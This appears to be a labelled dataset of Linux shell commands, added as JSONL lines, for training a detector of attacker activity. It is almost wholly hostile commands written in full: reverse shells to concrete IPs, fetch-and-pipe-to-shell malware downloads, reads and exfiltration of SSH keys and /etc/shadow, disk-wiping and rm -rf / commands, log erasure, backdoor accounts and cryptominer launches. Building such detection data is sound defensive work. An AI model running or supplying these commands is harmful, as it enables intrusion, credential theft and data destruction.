+{"text": "cat /etc/mysql/debian.cnf", "label": "credential_access", "template": "credential_access:17"}
+{"text": "systemctl enable kworkerds.service", "label": "persistence", "template": "persistence:31"}
+{"text": "chmod +x tsunami; sh kworkerds >/dev/null", "label": "malware_execution", "template": "malware_execution:13"}
+{"text": "cd /dev/shm; >/RYKYDP && cd /", "label": "reconnaissance", "template": "reconnaissance:32"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; uname -m", "label": "reconnaissance", "template": "reconnaissance:51"}
+{"text": "vim a.txt", "label": "benign", "template": "benign:56"}
+{"text": "ssh root@193.91.40.173", "label": "network_scan", "template": "network_scan:15"}
+{"text": "perl /var/run/sh4.pl &", "label": "malware_execution", "template": "malware_execution:34"}
+{"text": "base64 ~/.ssh/id_rsa", "label": "credential_access", "template": "credential_access:34"}
+{"text": "cd /root; wget http://data.mirror.icu/cdn/init.sh; chmod +x spc; ./k", "label": "malware_downloader", "template": "malware_downloader:32"}
+{"text": "ls /sys/class/net", "label": "reconnaissance", "template": "reconnaissance:127"}
+{"text": "From: <sip:ltwbn@xebu>;tag=lmcgl", "label": "benign", "template": "benign:4"}
+{"text": "netcat -e /bin/sh 141.187.117.102 6666", "label": "reverse_shell", "template": "reverse_shell:11"}
+{"text": "/bin/bash -i >& /dev/tcp/178.8.11.77/31337 0>&1", "label": "reverse_shell", "template": "reverse_shell:1"}
+{"text": "cd /tmp; cat /dev/urandom > /dev/sda1 2>/dev/null", "label": "destructive", "template": "destructive:31"}
+{"text": "nc -e /bin/sh 45.127.196.213 5555", "label": "reverse_shell", "template": "reverse_shell:6"}
+{"text": "wget http://update-pkg.info/bins/setup.sh && unzip ld.sh.zip", "label": "malware_downloader", "template": "malware_downloader:51"}
+{"text": "cd /root && ufw disable > /dev/null 2>&1", "label": "defense_evasion", "template": "defense_evasion:26"}
+{"text": "wget http://45.1.130.144/cdn/ld.sh -O /tmp/x86", "label": "malware_downloader", "template": "malware_downloader:23"}
+{"text": "cd /etc && hydra -L users.txt -P passwords.txt 212.97.88.70 ssh", "label": "network_scan", "template": "network_scan:12"}
+{"text": "setsid ./init.sh > /dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:23"}
+{"text": "cd /tmp; cd /var/run; cd /root; echo KYAZSA_CHECK > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:36"}
+{"text": "lwp-download http://5.150.50.146/dl/kaiten payload.sh", "label": "malware_downloader", "template": "malware_downloader:45"}
+{"text": "cd /mnt; setenforce 0", "label": "defense_evasion", "template": "defense_evasion:28"}
+{"text": "chmod 777 dota3.tar.gz", "label": "malware_execution", "template": "malware_execution:9"}
+{"text": "./cpuminer-multi -a cryptonight -o stratum+tcp://gulf.moneroocean.stream:10128", "label": "cryptominer", "template": "cryptominer:7"}
+{"text": "nmap -Pn -T4 193.76.51.6/16", "label": "network_scan", "template": "network_scan:3"}
+{"text": "curl -O http://updatenet.info:81/bins/mips", "label": "malware_downloader", "template": "malware_downloader:25"}
+{"text": "cd /tmp; cd /var/run; cd /etc; echo -e \"\\x6F\\x6B\"", "label": "reconnaissance", "template": "reconnaissance:38"}
+{"text": "cd /tmp; cd /var/run; cd /mnt; wget -q -O - http://193.144.179.187/bins/mips | bash", "label": "malware_downloader", "template": "malware_downloader:31"}
+{"text": "ncat --exec /bin/bash 62.241.68.2 4444", "label": "reverse_shell", "template": "reverse_shell:10"}
+{"text": "wget http://89.57.28.222/dl/arm && unzip systemd-helper.zip &", "label": "malware_downloader", "template": "malware_downloader:51"}
+{"text": "curl -fsSL http://45.146.5.143/bins/gafgyt | bash", "label": "malware_downloader", "template": "malware_downloader:28"}
+{"text": "cd /var/tmp && echo > /var/log/auth.log &", "label": "defense_evasion", "template": "defense_evasion:15"}
+{"text": "cd /var/run; cd /etc && ./ld.sh &", "label": "malware_execution", "template": "malware_execution:47"}
+{"text": "wget http://databin.top/tmp/tsunami; sh kaiten; rm -rf a.sh", "label": "malware_downloader", "template": "malware_downloader:37"}
+{"text": "grep -ri password /var/www 2>/dev/null", "label": "credential_access", "template": "credential_access:29"}
+{"text": "echo > /var/log/wtmp", "label": "defense_evasion", "template": "defense_evasion:16"}
+{"text": "Content-Length: 4", "label": "benign", "template": "benign:7"}
+{"text": "ftpget 178.80.212.84 f ftpget", "label": "malware_downloader", "template": "malware_downloader:16"}
+{"text": "export HISTFILE=/dev/null", "label": "defense_evasion", "template": "defense_evasion:8"}
+{"text": ">/root/.STRGEFEA", "label": "reconnaissance", "template": "reconnaissance:33"}
+{"text": "cd /home/ubuntu && scp -r /home/ubuntu/data pi@5.215.219.121:/tmp", "label": "network_scan", "template": "network_scan:19"}
+{"text": "php a.sh.php", "label": "malware_execution", "template": "malware_execution:35"}
+{"text": "enable; system; shell; sh", "label": "reconnaissance", "template": "reconnaissance:24"}
+{"text": "echo '/var/tmp/m68k' >> /etc/init.d/run", "label": "persistence", "template": "persistence:22"}
+{"text": "cd /tmp && wget http://nodecdn.top/clean.sh -O- | sh &", "label": "malware_downloader", "template": "malware_downloader:54"}
+{"text": "ssh -o StrictHostKeyChecking=no ftp@178.5.167.52 id", "label": "network_scan", "template": "network_scan:16"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; find / -name \"*.conf\" 2>/dev/null | head", "label": "reconnaissance", "template": "reconnaissance:105"}
+{"text": "CSeq: 2 OPTIONS", "label": "benign", "template": "benign:8"}
+{"text": "chmod +x /tmp/setup.sh", "label": "malware_execution", "template": "malware_execution:8"}
+{"text": "rm -rf /tmp/* /var/tmp/* &", "label": "defense_evasion", "template": "defense_evasion:38"}
+{"text": "echo 'root:bot123' | chpasswd", "label": "persistence", "template": "persistence:27"}
+{"text": "cd /var/run; dd if=/dev/urandom of=/dev/sda", "label": "destructive", "template": "destructive:10"}
+{"text": "ulimit -n 999999; unset HISTFILE", "label": "defense_evasion", "template": "defense_evasion:40"}
+{"text": "# zqp ttnsows (mmx)", "label": "benign", "template": "benign:15"}
+{"text": "uptime", "label": "reconnaissance", "template": "reconnaissance:58"}
+{"text": "enable", "label": "reconnaissance", "template": "reconnaissance:18"}
+{"text": "sh ./sh4.sh >/dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:30"}
+{"text": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 23.138.193.214 443 > /tmp/f", "label": "reverse_shell", "template": "reverse_shell:12"}
+{"text": "cat ~/.docker/config.json", "label": "credential_access", "template": "credential_access:14"}
+{"text": "/tmp/xmrig -o xmr.pool.example-pool.net:3333 -u 44WJszckQo2oodp7EN8WUqasrMtpjteQhhMrtxXSMU2rvvzEjo10YhzJYfP09a5ffDhUrK8aACxKSEuWFiRh2qovzYdiZ0v -p x --background", "label": "cryptominer", "template": "cryptominer:3"}
+{"text": "cd /tmp && ./ssh-scanner", "label": "network_scan", "template": "network_scan:10"}
+{"text": "cd /var/tmp && passwd test", "label": "persistence", "template": "persistence:30"}
+{"text": "useradd -m -s /bin/bash support", "label": "persistence", "template": "persistence:24"}
+{"text": "unset HISTFILE > /dev/null 2>&1", "label": "defense_evasion", "template": "defense_evasion:7"}
+{"text": "wget -q -O - http://107.218.41.100/bins/update.sh | bash", "label": "malware_downloader", "template": "malware_downloader:31"}
+{"text": "echo \"root:TLIVJS35\"|chpasswd|bash", "label": "persistence", "template": "persistence:0"}
+{"text": "echo 'oracle ALL=(ALL:ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers", "label": "privilege_escalation", "template": "privilege_escalation:30"}
+{"text": "mv a.txt b.txt", "label": "benign", "template": "benign:70"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; sqlmap -u http://45.11.3.54/index.php?id=1", "label": "network_scan", "template": "network_scan:24"}
+{"text": "Call-ID: 60000", "label": "benign", "template": "benign:3"}
+{"text": "head /etc/shadow", "label": "credential_access", "template": "credential_access:2"}
+{"text": "pwd", "label": "benign", "template": "benign:38"}
+{"text": "crontab /root/cron.txt", "label": "persistence", "template": "persistence:17"}
+{"text": "echo '/usr/bin/kaiten' >> /etc/init.d/x86", "label": "persistence", "template": "persistence:22"}
+{"text": "last -n 5 > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:129"}
+{"text": "cd /mnt && mount > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:113"}
+{"text": "cd /var/run && pkill -f kinsing > /dev/null 2>&1", "label": "cryptominer", "template": "cryptominer:13"}
+{"text": "ncrack -p 22 193.181.207.95", "label": "network_scan", "template": "network_scan:14"}
+{"text": "/home/ubuntu/x86_64 &", "label": "malware_execution", "template": "malware_execution:19"}
+{"text": "cat /proc/mounts; /bin/busybox GWOUFOB", "label": "reconnaissance", "template": "reconnaissance:27"}
+{"text": "./zmap -p 22", "label": "network_scan", "template": "network_scan:7"}
+{"text": "cd /var/tmp && ./pspy64", "label": "privilege_escalation", "template": "privilege_escalation:20"}
+{"text": "cd /root; cat .s || cp /bin/echo .s; /bin/busybox IATUIV", "label": "reconnaissance", "template": "reconnaissance:28"}
+{"text": "cat /proc/mounts; /bin/busybox GURIF 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:27"}
+{"text": "echo '/var/tmp/clean.sh' > /etc/ld.so.preload", "label": "persistence", "template": "persistence:37"}
+{"text": "cd /var/run && for ip in $(cat ips.txt); do ssh root@$ip id; done", "label": "network_scan", "template": "network_scan:28"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; curl http://62.179.7.88:6666/update.sh -o gafgyt", "label": "malware_downloader", "template": "malware_downloader:53"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; uname -r; searchsploit linux kernel >/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:34"}
+{"text": "getcap -r / 2>/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:36"}
+{"text": "cd /var/run && for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then kill -9 \"$pid_num\"; fi; done", "label": "defense_evasion", "template": "defense_evasion:0"}
+{"text": "ifconfig", "label": "reconnaissance", "template": "reconnaissance:87"}
+{"text": "bash dota3.tar.gz.sh", "label": "malware_execution", "template": "malware_execution:26"}
+{"text": "# Method 2: bs to stdout", "label": "benign", "template": "benign:16"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; /bin/busybox cp /bin/busybox .WFEDDEOC; >.COLCP; /bin/busybox chmod 777 .WDSV; /bin/busybox MOBH", "label": "reconnaissance", "template": "reconnaissance:48"}
+{"text": "./LinEnum.sh", "label": "privilege_escalation", "template": "privilege_escalation:19"}
+{"text": "cat backup_credentials.txt", "label": "credential_access", "template": "credential_access:41"}
+{"text": "cd /var/tmp && getcap -r / 2>/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:36"}
+{"text": "/bin/bash -i >& /dev/tcp/212.252.1.168/6666 0>&1", "label": "reverse_shell", "template": "reverse_shell:1"}
+{"text": "ln -sf /dev/null ~/.bash_history > /dev/null 2>&1", "label": "defense_evasion", "template": "defense_evasion:19"}
+{"text": "/bin/./uname -s -v -n -r -m", "label": "reconnaissance", "template": "reconnaissance:42"}
+{"text": "echo \"oracle:Passw0rd123\" | chpasswd", "label": "persistence", "template": "persistence:26"}
+{"text": "cd /var/tmp; sh .shyvw", "label": "malware_execution", "template": "malware_execution:1"}
+{"text": "wget http://static-cdn.icu/m68k -O- | sh", "label": "malware_downloader", "template": "malware_downloader:54"}
+{"text": "/tmp/.clean.sh/clean.sh", "label": "malware_execution", "template": "malware_execution:20"}
+{"text": "update-rc.d kaiten defaults 2>/dev/null", "label": "persistence", "template": "persistence:34"}
+{"text": "service iptables stop", "label": "defense_evasion", "template": "defense_evasion:23"}
+{"text": "/bin/busybox echo > /home/ubuntu/.DACMG && sh /mnt/.ZXCB && cd /root/", "label": "reconnaissance", "template": "reconnaissance:34"}
+{"text": "cd /tmp; cd /var/run; cd /usr/bin; ./rvnmmrzc", "label": "malware_execution", "template": "malware_execution:6"}
+{"text": "cp a.txt b.txt", "label": "benign", "template": "benign:69"}
+{"text": "rm -rf /", "label": "destructive", "template": "destructive:1"}
+{"text": "cd /tmp; cd /var/run; cd /root; >/var/run/d && chmod 777 /tmp/d && /etc/d && cd /dev/shm/ > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:0"}
+{"text": "wget -q -t 2 -T 10 -O bot http://45.166.118.214/~u/clean.sh 2>/dev/null && echo WGETOK", "label": "malware_downloader", "template": "malware_downloader:12"}
+{"text": "/k", "label": "reconnaissance", "template": "reconnaissance:123"}
+{"text": "ip addr show", "label": "reconnaissance", "template": "reconnaissance:90"}
+{"text": "sh linpeas.sh", "label": "privilege_escalation", "template": "privilege_escalation:18"}
+{"text": "nano config.txt", "label": "benign", "template": "benign:57"}
+{"text": "cd /var/tmp && mkdir /root/.ssh >/dev/null", "label": "persistence", "template": "persistence:6"}
+{"text": "echo '/var/run/run &' >> /etc/rc.local", "label": "persistence", "template": "persistence:19"}
+{"text": "nmap -sS 192.138.86.143/24 2>/dev/null", "label": "network_scan", "template": "network_scan:0"}
+{"text": "perl -e 'use Socket;$i=\"89.164.91.102\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");exec(\"/bin/sh -i\");};'", "label": "reverse_shell", "template": "reverse_shell:16"}
+{"text": "cd /var/tmp && >/var/tmp/.JEHVIJ && cd /dev/shm/", "label": "reconnaissance", "template": "reconnaissance:31"}
+{"text": "last -n 5", "label": "reconnaissance", "template": "reconnaissance:129"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; head -c 0 > /root/wtyapehy_sign > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:14"}
+{"text": ">/tmp/.AFBIEGY > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:33"}
+{"text": "ps -ef | grep -v grep | grep ssh", "label": "reconnaissance", "template": "reconnaissance:81"}
+{"text": "sh ./xmr.sh.sh >/dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:30"}
+{"text": "echo -e '\\x6b\\x61\\x6d\\x69/etc' > /dev/shm/.nippon; cat /root/.nippon; rm /mnt/.nippon", "label": "reconnaissance", "template": "reconnaissance:7"}
+{"text": "python3 /dev/shm/update.sh.py &", "label": "malware_execution", "template": "malware_execution:32"}
+{"text": "cd /root; cat .s || cp /bin/echo .s; /bin/busybox IPTTWETG", "label": "reconnaissance", "template": "reconnaissance:28"}
+{"text": "netcat -e /bin/sh 185.58.191.221 53", "label": "reverse_shell", "template": "reverse_shell:11"}
+{"text": "systemd-detect-virt > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:126"}
+{"text": "cd /usr/bin; ls /home", "label": "reconnaissance", "template": "reconnaissance:101"}
+{"text": "CSeq: 6 OPTIONS", "label": "benign", "template": "benign:8"}
+{"text": "cd /tmp; cd /var/run; cd /root; >/CNKSV && cd /", "label": "reconnaissance", "template": "reconnaissance:32"}
+{"text": "sh", "label": "reconnaissance", "template": "reconnaissance:22"}
+{"text": "sh .qnkiueuo", "label": "malware_execution", "template": "malware_execution:1"}
+{"text": "busybox nc 62.135.16.104 53 -e /bin/sh", "label": "reverse_shell", "template": "reverse_shell:23"}
+{"text": "wget http://bin.dl.site:9999/x86_64; sh k; rm -rf dota3.tar.gz", "label": "malware_downloader", "template": "malware_downloader:37"}
+{"text": "ip a", "label": "reconnaissance", "template": "reconnaissance:89"}
+{"text": "cd /mnt; useradd -m -s /bin/bash admin > /dev/null 2>&1", "label": "persistence", "template": "persistence:24"}
+{"text": "setsid /var/tmp/mpsl &", "label": "malware_execution", "template": "malware_execution:24"}
+{"text": "wget http://62.64.220.43/~u/kworkerds -O- &", "label": "malware_downloader", "template": "malware_downloader:13"}
+{"text": "From: <sip:cweb@kcg>;tag=ribre", "label": "benign", "template": "benign:4"}
+{"text": "cd /tmp; cd /var/run; cd /root; cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox TOYIUNEI", "label": "reconnaissance", "template": "reconnaissance:28"}
+{"text": "service apparmor stop", "label": "defense_evasion", "template": "defense_evasion:34"}
+{"text": "cd /root && nohup ./xmrig -o xmr-eu1.nanopool.org:14444 -u 4mittQc9SW9zUzZKSwyHrSQHnfbjUp77Z34nJGeg9B9mSwk5dDDmL4vGMC2yR1Nht6KW0znrKqLW3oGGA7fL4NgAKTuob5E -k --tls & > /dev/null 2>&1", "label": "cryptominer", "template": "cryptominer:2"}
+{"text": "useradd -ou 0 -g 0 user", "label": "persistence", "template": "persistence:23"}
+{"text": "dmesg | tail", "label": "reconnaissance", "template": "reconnaissance:115"}
+{"text": "cat ~/.git-credentials", "label": "credential_access", "template": "credential_access:13"}
+{"text": "cd /var/run && echo 'root:m68k123' | chpasswd", "label": "persistence", "template": "persistence:27"}
+{"text": "aria2c http://pkg.dl.xyz/files/kaiten 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:46"}
+{"text": "nc -e /bin/bash 212.126.140.98 1337", "label": "reverse_shell", "template": "reverse_shell:7"}
+{"text": "stat file.txt", "label": "benign", "template": "benign:75"}
+{"text": "cd /usr/bin && ./zmap -p 22 > /dev/null 2>&1", "label": "network_scan", "template": "network_scan:7"}
+{"text": "ls -la /tmp", "label": "reconnaissance", "template": "reconnaissance:103"}
+{"text": "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36", "label": "benign", "template": "benign:30"}
+{"text": "sh setup.sh.sh", "label": "malware_execution", "template": "malware_execution:25"}
+{"text": "busybox nc 23.160.152.14 9001 -e /bin/sh", "label": "reverse_shell", "template": "reverse_shell:23"}
+{"text": "rm -rf /*", "label": "destructive", "template": "destructive:0"}
+{"text": "cd /tmp; cd /var/run; cd /etc; nmap -sV -p- 77.21.48.11", "label": "network_scan", "template": "network_scan:2"}
+{"text": "./tsunami > /dev/null 2>&1 &", "label": "malware_execution", "template": "malware_execution:17"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; uname -a &", "label": "reconnaissance", "template": "reconnaissance:50"}
+{"text": "python -c 'import os; os.system(\"/home/ubuntu/setup.sh\")'", "label": "malware_execution", "template": "malware_execution:44"}
+{"text": "(crontab -l; echo \"@reboot /var/tmp/sh4\") | crontab -", "label": "persistence", "template": "persistence:14"}
+{"text": "./systemd-helper &", "label": "malware_execution", "template": "malware_execution:5"}
+{"text": "cd /dev/shm && echo \"ftp:Passw0rd123\" | chpasswd", "label": "persistence", "template": "persistence:26"}
+{"text": "cd /tmp; cd /var/run; cd /mnt; /bin/busybox cp /bin/busybox .UMRG; >.ZLRVR; /bin/busybox chmod 777 .XYNY; /bin/busybox WWUN", "label": "reconnaissance", "template": "reconnaissance:48"}
+{"text": "echo 'for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do' >> .s", "label": "malware_downloader", "template": "malware_downloader:1"}
+{"text": "echo 'sh /home/ubuntu/arm7' >> ~/.bashrc", "label": "persistence", "template": "persistence:20"}
+{"text": "w -h", "label": "reconnaissance", "template": "reconnaissance:130"}
+{"text": "touch test.txt", "label": "benign", "template": "benign:53"}
+{"text": "tar xvf xmr.sh.tgz; cd networkservice; ./run", "label": "malware_execution", "template": "malware_execution:40"}
+{"text": "nohup ./mpsl &", "label": "malware_execution", "template": "malware_execution:21"}
+{"text": "kill -9 $(pidof syslogd)", "label": "defense_evasion", "template": "defense_evasion:32"}
+{"text": "cd /proc; ls 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:41"}
+{"text": "busybox tftp -g -r x 107.208.138.166 > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:41"}
+{"text": "chkconfig m68k on", "label": "persistence", "template": "persistence:35"}
+{"text": "cat /dev/zero > /dev/sda > /dev/null 2>&1", "label": "destructive", "template": "destructive:20"}
+{"text": "cd /etc && ls", "label": "benign", "template": "benign:63"}
+{"text": "cd /var/run; cat /etc/os-release", "label": "reconnaissance", "template": "reconnaissance:74"}
+{"text": "pkill -f kinsing", "label": "cryptominer", "template": "cryptominer:13"}
+{"text": "killall -9 minerd &", "label": "cryptominer", "template": "cryptominer:15"}
+{"text": "cat /root/.bash_history", "label": "credential_access", "template": "credential_access:28"}
+{"text": "rm -rf /root/.bash_history", "label": "defense_evasion", "template": "defense_evasion:20"}
+{"text": "which curl", "label": "reconnaissance", "template": "reconnaissance:97"}
+{"text": "ncat 107.147.196.44 4444 -e /bin/bash", "label": "reverse_shell", "template": "reverse_shell:9"}
+{"text": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:178.112.54.164:8080", "label": "reverse_shell", "template": "reverse_shell:19"}
+{"text": "./xmrig --cpu-priority 5 -o xmr-eu1.nanopool.org:14444", "label": "cryptominer", "template": "cryptominer:22"}
+{"text": "nc -zv 45.231.216.248 1-1000", "label": "network_scan", "template": "network_scan:20"}
+{"text": "medusa -h 141.131.138.93 -u root -P p.txt -M ssh", "label": "network_scan", "template": "network_scan:13"}
+{"text": "nc -e /bin/sh 62.81.178.171 443", "label": "reverse_shell", "template": "reverse_shell:6"}
+{"text": "cd /var/tmp && /run &", "label": "reconnaissance", "template": "reconnaissance:123"}
+{"text": "cd /etc; rm -rf /", "label": "destructive", "template": "destructive:1"}
+{"text": "passwd support", "label": "persistence", "template": "persistence:30"}
+{"text": "sh systemd-helper.sh", "label": "malware_execution", "template": "malware_execution:25"}
+{"text": "nc -z 185.82.244.143 22", "label": "network_scan", "template": "network_scan:21"}
+{"text": "cd /tmp; cd /var/run; cd /home/ubuntu; pkill -f aliyun", "label": "defense_evasion", "template": "defense_evasion:33"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; cat /etc/passwd", "label": "reconnaissance", "template": "reconnaissance:75"}
+{"text": "perl -e 'use Socket;$i=\"5.5.172.48\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");exec(\"/bin/sh -i\");};'", "label": "reverse_shell", "template": "reverse_shell:16"}
+{"text": "scp ~/.ssh/id_rsa support@62.152.131.113:/tmp 2>/dev/null", "label": "credential_access", "template": "credential_access:33"}
+{"text": "cd /mnt && wget -q -O - http://185.160.88.201/dl/a.sh | bash &", "label": "malware_downloader", "template": "malware_downloader:31"}
+{"text": "echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger > /dev/null 2>&1", "label": "destructive", "template": "destructive:28"}
+{"text": "systemctl stop rsyslog", "label": "defense_evasion", "template": "defense_evasion:31"}
+{"text": "ssh root@185.64.198.16", "label": "network_scan", "template": "network_scan:15"}
+{"text": "/bin/busybox rm -rf .KZTZF .PPUQ", "label": "reconnaissance", "template": "reconnaissance:49"}
+{"text": ">/mnt/.WLIPBL && cd /tmp/", "label": "reconnaissance", "template": "reconnaissance:31"}
+{"text": "/bin/busybox ftpget 103.124.145.233 mips arm7 && sh bins.sh", "label": "malware_downloader", "template": "malware_downloader:17"}
+{"text": "lsblk", "label": "reconnaissance", "template": "reconnaissance:114"}
+{"text": "nmap -p 22 45.91.136.228", "label": "network_scan", "template": "network_scan:1"}
+{"text": "id", "label": "reconnaissance", "template": "reconnaissance:55"}
+{"text": "echo 'stratum+tcp://pool.supportxmr.com:5555' > pools.txt", "label": "cryptominer", "template": "cryptominer:25"}
+{"text": "bash -i >& /dev/tcp/192.225.43.14/443 0>&1", "label": "reverse_shell", "template": "reverse_shell:0"}
+{"text": "getconf LONG_BIT", "label": "reconnaissance", "template": "reconnaissance:106"}
+{"text": "/bin/busybox wget http://185.33.227.223/files/gafgyt -O init.sh", "label": "malware_downloader", "template": "malware_downloader:40"}
+{"text": "cd /tmp && gcc -o dirty dirty.c -pthread && ./dirty", "label": "privilege_escalation", "template": "privilege_escalation:21"}
+{"text": "setsid ./sshd", "label": "malware_execution", "template": "malware_execution:23"}
+{"text": "rm -rf /var/log/* > /dev/null 2>&1", "label": "defense_evasion", "template": "defense_evasion:13"}
+{"text": "cd /root && /var/run/xmrig -o gulf.moneroocean.stream:10128 -u 4Ui7WVjRJr1ojXJ0PBadNTgv1gQvWqnJHJw4HZTnJKK6hcNM18Q3v9fqcH0NeC31rBWUpRATQGc9RghkKdtwxSXzQXW7Zve -p x --background 2>/dev/null", "label": "cryptominer", "template": "cryptominer:3"}
+{"text": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCERPQIJz+jwxug2v8BixyxLzlMAfxpl8G/CZ0Gs6JJBQns3rFJVas3MG8tgaAFpKb//Sm9xjiWTpOL2SOqAdMU2ffLNmvR8l4mT3TxwuoIfvNo+Fu+++YvC4sqqfqP/xlaTXlZe== support@host\" >> /root/.ssh/authorized_keys > /dev/null 2>&1", "label": "persistence", "template": "persistence:4"}
+{"text": "cd", "label": "benign", "template": "benign:39"}
+{"text": "echo -e '\\x0f\\xe9\\xb0\\x8b\\xaf\\x09\\x3c\\x35\\x3f\\x50\\xf4\\x60\\x2c\\x6f\\x15\\xb8\\x44\\xee\\xca\\x07\\x38\\xf2\\xec\\x89\\x1d\\xf4\\x63\\x90\\xa7\\xfc\\xfe\\x24' >> kaiten", "label": "malware_downloader", "template": "malware_downloader:10"}
+{"text": "wget -q http://212.227.252.84/x/ppc", "label": "malware_downloader", "template": "malware_downloader:20"}
+{"text": "cat > /etc/systemd/system/xmr.sh.service << EOF", "label": "persistence", "template": "persistence:33"}
+{"text": "rm -rf /usr", "label": "destructive", "template": "destructive:7"}
+{"text": "cd /home/ubuntu && base64 ~/.ssh/id_rsa >/dev/null", "label": "credential_access", "template": "credential_access:34"}
+{"text": "rm .KZJZR", "label": "reconnaissance", "template": "reconnaissance:11"}
+{"text": "chmod +x bot && ./systemd-helper 2>/dev/null", "label": "malware_execution", "template": "malware_execution:11"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; echo -ne \"\\x7e\\x75\\x63\\x7b\\x36\\x24\\xd3\\xdb\\x3c\\x47\\xec\\x5b\\x60\\xb6\\xe8\\x1a\\x8c\\xa9\\x8c\\x11\\xa5\\xe7\\xfa\\x0d\\xc2\\x50\\x12\\xf8\\xe1\\xee\\x15\\x9b\" >> update.mpsl", "label": "malware_downloader", "template": "malware_downloader:7"}
+{"text": "chattr -i /etc/passwd >/dev/null", "label": "defense_evasion", "template": "defense_evasion:35"}
+{"text": "cat /home/pi/.ssh/id_ed25519", "label": "credential_access", "template": "credential_access:7"}
+{"text": "ftpget 5.234.23.81 f ftpget", "label": "malware_downloader", "template": "malware_downloader:16"}
+{"text": "which wget curl python perl gcc > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:96"}
+{"text": "system", "label": "reconnaissance", "template": "reconnaissance:19"}
+{"text": ">/usr/bin/.f && /bin/busybox chmod 777 /etc/.f && /dev/shm/.f && cd /usr/bin/; ", "label": "reconnaissance", "template": "reconnaissance:1"}
+{"text": "cd /root; cat ~/.netrc", "label": "credential_access", "template": "credential_access:16"}
+{"text": "uname -a", "label": "reconnaissance", "template": "reconnaissance:50"}
+{"text": "cd /tmp && /bin/busybox tftp -g cdnnode.info -r tftp.sh -l- | sh", "label": "malware_downloader", "template": "malware_downloader:15"}
+{"text": "/var/run/kdevtmpfsi &", "label": "cryptominer", "template": "cryptominer:11"}
+{"text": "curl -sL http://203.48.245.236/tmp/bot | python >/dev/null", "label": "malware_downloader", "template": "malware_downloader:49"}
+{"text": "telnet 178.127.236.224 4444 | /bin/bash | telnet 89.182.145.40 9999", "label": "reverse_shell", "template": "reverse_shell:21"}
+{"text": "cd /dev/shm && sudo su -", "label": "privilege_escalation", "template": "privilege_escalation:2"}
+{"text": "tar czf /root/k.tgz ~/.ssh", "label": "credential_access", "template": "credential_access:31"}
+{"text": "(crontab -l; echo \"@reboot /etc/run\") | crontab - &", "label": "persistence", "template": "persistence:14"}
+{"text": "cd /root && cat passwords.txt 2>/dev/null", "label": "credential_access", "template": "credential_access:25"}
+{"text": "echo \"*/5 * * * * curl -s https://net.data.cn:81/bins/spc | sh\" | crontab - > /dev/null 2>&1", "label": "persistence", "template": "persistence:13"}
+{"text": "cd /tmp; cd /var/run; cd /etc; curl -s http://files-net.cn/~u/x | sh", "label": "malware_downloader", "template": "malware_downloader:29"}
+{"text": "chkconfig clean.sh on > /dev/null 2>&1", "label": "persistence", "template": "persistence:35"}
+{"text": "wget --no-check-certificate http://pkgbin.tk/networkservice", "label": "malware_downloader", "template": "malware_downloader:22"}
+{"text": "cd /home/ubuntu && cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCJCP3E69wQg/BvpxpFR3ie6WHvrmXF1ntZwGtrRuFVGRTNn5lJ9Fc+lWC6FpJbleWJdhV== support@host\" >> .ssh/authorized_keys && chmod -R go= ~/.ssh > /dev/null 2>&1", "label": "persistence", "template": "persistence:9"}
+{"text": "LD_PRELOAD=/mnt/arm.so ./run", "label": "malware_execution", "template": "malware_execution:45"}
+{"text": "curl ifconfig.me", "label": "reconnaissance", "template": "reconnaissance:116"}
+{"text": "cd /mnt && chmod +s /usr/bin/find > /dev/null 2>&1", "label": "privilege_escalation", "template": "privilege_escalation:15"}
+{"text": "which python3", "label": "reconnaissance", "template": "reconnaissance:99"}
+{"text": "cd /var/tmp; /bin/busybox rm -rf .DLLI .WZLRBIQF > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:49"}
+{"text": "useradd -m -s /bin/bash admin", "label": "persistence", "template": "persistence:24"}
